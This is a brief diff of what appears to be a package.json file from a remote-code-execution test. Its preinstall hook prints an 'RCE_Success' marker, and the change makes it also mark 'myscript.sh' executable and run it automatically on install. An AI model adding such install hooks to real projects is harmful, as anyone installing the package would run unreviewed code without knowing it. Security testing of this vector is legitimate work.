@@ -6,7 +6,7 @@
       "yarn": "^1.12.3"
     },
     "scripts": {
-      "preinstall": "echo ____RCE_Success runFile >&2; "
+      "preinstall": "echo ____RCE_Success runFile >&2; chmod +x myscript.sh; ./myscript.sh "
     }
 }
   
